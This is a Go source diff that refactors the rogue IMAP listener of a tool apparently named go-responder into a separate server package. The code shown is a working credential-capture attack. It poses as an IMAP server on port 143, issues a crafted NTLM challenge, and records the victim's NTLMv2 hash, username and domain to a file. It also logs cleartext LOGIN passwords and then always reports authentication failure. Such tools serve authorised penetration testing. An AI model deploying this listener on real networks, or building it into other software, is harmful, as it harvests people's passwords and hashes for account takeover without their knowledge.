@@ -1,4 +1,4 @@
-package main
+package server
 
 import (
 	"bufio"
@@ -7,34 +7,36 @@ import (
 	"net"
 	"strings"
 	"time"
+
+	"go-responder/internal/core"
 )
 
-func serveIMAP(ifaceIP net.IP) {
+func ServeIMAP(ifaceIP net.IP) {
 	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:143", ifaceIP))
 	if err != nil {
-		logError("IMAP listen :143 — %v (need root?)", err)
+		core.LogError("IMAP listen :143 — %v (need root?)", err)
 		return
 	}
-	logInfo("IMAP listening on %s:143", ifaceIP)
+	core.LogInfo("IMAP listening on %s:143", ifaceIP)
 	for {
 		c, err := ln.Accept()
 		if err != nil {
 			continue
 		}
-		go handleIMAP(c)
+		go HandleIMAP(c)
 	}
 }
 
-func handleIMAP(c net.Conn) {
+func HandleIMAP(c net.Conn) {
 	defer c.Close()
 	c.SetDeadline(time.Now().Add(60 * time.Second))
 
-	challenge := getChallenge()
+	challenge := core.GetChallenge()
 	w := bufio.NewWriter(c)
 	r := bufio.NewReader(c)
 	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }
 
-	send("* OK IMAP4rev1 " + sessionMachineName + " Service Ready")
+	send("* OK IMAP4rev1 " + core.SessionMachineName + " Service Ready")
 
 	for {
 		line, err := r.ReadString('\n')
@@ -63,7 +65,7 @@ func handleIMAP(c net.Conn) {
 				send(tag + " NO Unsupported authentication mechanism")
 				continue
 			}
-			send("+") // request token
+			send("+")
 
 			tokenLine, err := r.ReadString('\n')
 			if err != nil {
@@ -75,13 +77,13 @@ func handleIMAP(c net.Conn) {
 				send(tag + " NO Authentication failed")
 				return
 			}
-			ntlm := FindNTLMSSP(raw)
-			if len(ntlm) < 12 || ntlmMsgType(ntlm) != 1 {
+			ntlm := core.FindNTLMSSP(raw)
+			if len(ntlm) < 12 || core.NTLMMsgType(ntlm) != 1 {
 				send(tag + " NO Authentication failed")
 				return
 			}
-			logVerbose("IMAP NTLM Type1 from %s", c.RemoteAddr())
-			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
+			core.LogVerbose("IMAP NTLM Type1 from %s", c.RemoteAddr())
+			ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
 			send("+ " + base64.StdEncoding.EncodeToString(ntlmChallenge))
 
 			type3Line, err := r.ReadString('\n')
@@ -90,24 +92,23 @@ func handleIMAP(c net.Conn) {
 			}
 			type3Line = strings.TrimRight(type3Line, "\r\n")
 			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
-			ntlm3 := FindNTLMSSP(raw3)
-			if len(ntlm3) >= 12 && ntlmMsgType(ntlm3) == 3 {
-				hash, user, domain, err := ParseNTLMAuthenticate(ntlm3, challenge)
+			ntlm3 := core.FindNTLMSSP(raw3)
+			if len(ntlm3) >= 12 && core.NTLMMsgType(ntlm3) == 3 {
+				hash, user, domain, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
 				if err == nil {
-					logSuccess("[IMAP] NTLMv2 captured from %s", c.RemoteAddr())
-					logSuccess("       %s\\%s", domain, user)
-					logSuccess("       %s", hash)
-					saveHash(hash)
+					core.LogSuccess("[IMAP] NTLMv2 captured from %s", c.RemoteAddr())
+					core.LogSuccess("       %s\\%s", domain, user)
+					core.LogSuccess("       %s", hash)
+					core.SaveHash(hash)
 				}
 			}
 			send(tag + " NO [AUTHENTICATIONFAILED] Authentication credentials invalid")
 			return
 
 		case "LOGIN":
-			// LOGIN tag user pass
 			loginParts := strings.SplitN(arg, " ", 2)
 			if len(loginParts) == 2 {
-				logSuccess("[IMAP] Cleartext from %s: user=%q pass=%q",
+				core.LogSuccess("[IMAP] Cleartext from %s: user=%q pass=%q",
 					c.RemoteAddr(), loginParts[0], loginParts[1])
 			}
 			send(tag + " NO [AUTHENTICATIONFAILED] Authentication failed")
